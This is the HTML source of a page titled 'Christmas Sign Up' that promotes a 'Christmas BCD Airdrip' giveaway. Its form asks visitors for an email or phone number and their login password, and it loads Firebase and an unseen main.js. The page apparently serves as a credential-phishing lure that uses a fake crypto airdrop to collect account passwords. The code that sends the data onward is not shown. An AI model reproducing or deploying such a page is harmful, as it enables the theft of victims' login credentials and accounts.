<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Christmas Sign Up</title>
  <link rel="icon" href="https://ml.globenewswire.com/Resource/Download/9d1554f8-7bac-4823-a9e7-21dd6ddd55cb?size=3" type="image/png">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.css" />
  <link rel="stylesheet" href="styles.css">
  <style>
    body {
      background-color: rgb(4, 101, 4);
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .wrapper {
      background: rgba(255, 255, 255, 0.8);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    .contact img {
      max-width: 100%;
      border-radius: 10px;
    }
    .contact input[type="email"], .contact input[type="password"] {
      width: calc(100% - 20px);
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #2fb100;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .contact button {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #07980c;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    .contact button:hover {
      background-color: #00ca0a;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="wrapper">
      <div class="contact">
        <form id="contactForm">
          <p>
            <img src="senta.jpeg" alt="">
            <h1>Christmas BCD Airdrip..</h1>
            <input type="email" placeholder="Email or Phone" name="email" id="email" required>
          </p>
          <p>
            <input type="password" placeholder="Login Password" name="password" id="password" required>
          </p>
          <p class="full">
            <button type="submit">SignIn</button>
          </p>
        </form>
      </div>
    </div>
  </div>
  <script src="https://www.gstatic.com/firebasejs/4.3.0/firebase.js"></script>
  <script src="main.js"></script>
</body>
</html>
